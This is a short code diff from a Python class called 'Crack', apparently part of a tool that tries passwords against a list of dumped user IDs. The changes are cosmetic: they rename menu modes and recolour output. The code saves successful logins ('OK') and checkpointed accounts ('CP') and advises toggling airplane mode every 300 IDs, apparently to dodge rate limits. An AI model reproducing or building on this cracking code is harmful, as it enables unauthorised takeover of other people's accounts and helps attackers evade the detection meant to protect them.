@@ -482,11 +482,11 @@ class Crack:
     def Generate_list(self):
         global prog,des
         print('\n')
-        Cons().print(f' {P}[{H}1{P}] {C}MODE HARAM')
-        Cons().print(f' {P}[{H}2{P}] {C}MODE ANJAY')
+        Cons().print(f'1 {C}Reguler')
+        Cons().print(f'2 {C}RegulerV2')
         Cons().print(f' ')
         execlogin = Cons().input(f'\n {H}»{P} Choose 1 / 2 : ')
-        Cons().print(f'\n {P}[{H}*{P}] Hasil OK Simpan/{H}OK/{self.okc} \n {A}[{J}*{A}] Hasil CP Simpan/{K}CP/{self.cpc} \n\n {J}#{A} Mainkan Mode Pesawat Setiap 300 ID\n')
+        Cons().print(f'\n {P}[{H}*{P}] Hasil OK Simpan/{H}OK/{self.okc} \n {P}[{H}*{P}] Hasil CP Simpan/{K}CP/{self.cpc} \n\n {H}#{P} Mainkan Mode Pesawat Setiap 300 ID\n')
         prog = Progress(TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%"))
         des = prog.add_task('',total=len(dumpid))
         with prog:
@@ -513,7 +513,7 @@ class Crack:
         
     #-----[ METHOD-REGULER ]-----#
     def Reguler(self,userid,password):
-        prog.update(des,description=f' {H}# {A}KREK {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
+        prog.update(des,description=f' {H}# {A}KREK {H}{self.suck}{A}/{K}{self.check} {H}{len(dumpid)}{A}/{J}{self.loop}{A}')
         prog.advance(des)
         for userpas in password:
             try:
